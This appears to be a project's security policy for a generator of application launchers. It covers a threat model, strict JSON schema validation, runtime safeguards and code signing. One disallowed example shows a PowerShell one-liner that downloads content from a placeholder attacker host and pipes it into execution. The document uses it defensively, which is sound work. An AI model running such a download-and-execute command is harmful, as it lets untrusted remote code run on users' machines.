### Overview

This project is a **secure application launcher generator**, not a script execution platform.

Users describe *what applications they want to open* using a **strict JSON configuration schema**.

The system then generates a launcher (BAT / PowerShell / EXE) that **only starts existing applications** on the user’s machine.

At no point does this project execute user-provided code.

---

### Threat Model

This project explicitly assumes the following threats:

- Malicious users attempting to generate malware executables
- Script injection (PowerShell, CMD, shell operators)
- Persistence mechanisms (startup, registry, scheduled tasks)
- Privilege escalation
- Antivirus evasion techniques

All core design decisions are made to **prevent these attack classes**.

---

### Security Design Principles

### 1. No Arbitrary Code Execution

- The backend **never executes** user input
- The system does **not accept scripts**
- Users define *intent*, not *code*

Example (allowed):

```json
{
	"apps": [
			{"path":"C:\\Program Files\\Postman\\Postman.exe"}
		]
}
```

Example (not allowed):

```powershell
Invoke-WebRequest evil.com |iex
```

---

### 2. Strict Schema Validation

All user input must pass a **strict JSON Schema** validation:

- No additional properties allowed
- No dynamic expressions
- No environment variable expansion
- Maximum limits on:
    - Number of apps
    - Argument length
    - Delay duration

If validation fails, generation is aborted.

---

### 3. Declarative Configuration Only

The system accepts **declarative configuration**, not procedural logic.

Users cannot:

- Run loops
- Run conditions
- Access filesystem beyond app paths
- Access registry
- Make network calls

This dramatically reduces attack surface.

---

### 4. Static Launcher Binary

All EXE launchers are generated from:

- A **single static, audited binary**
- The same logic for every user
- A restricted runtime environment

Only the embedded JSON configuration differs.

This prevents:

- Polymorphic malware patterns
- Obfuscation-based attacks
- AV signature evasion

---

### 5. Runtime Safeguards

At runtime, the launcher:

- Re-validates the embedded configuration
- Verifies that target executables exist
- Starts processes without shell execution
- Never writes files
- Never modifies registry
- Never elevates privileges

---

### What This Project Will Never Do

This project will **never**:

- Download files
- Execute scripts
- Modify startup settings
- Modify system configuration
- Require administrator privileges
- Run background services
- Perform network communication from the launcher

If a future feature requires any of the above, it will be considered **out of scope** and rejected.

---

### Code Signing

All distributed executables are:

- Signed with a single code-signing certificate
- Verifiable via checksum
- Reproducible from source

Unsigned binaries are **not supported**.

---

### Reporting Security Issues

If you discover a vulnerability:

- Please open a **private security advisory** (if supported)
- Or contact the maintainer directly

Do **not** open public issues for active security vulnerabilities.

---

### Transparency & Trust

- Full source code is available
- No telemetry or tracking is included
- No user data is stored
- No analytics are embedded in the launcher

Security is achieved through **restriction, transparency, and reproducibility**, not obscurity.
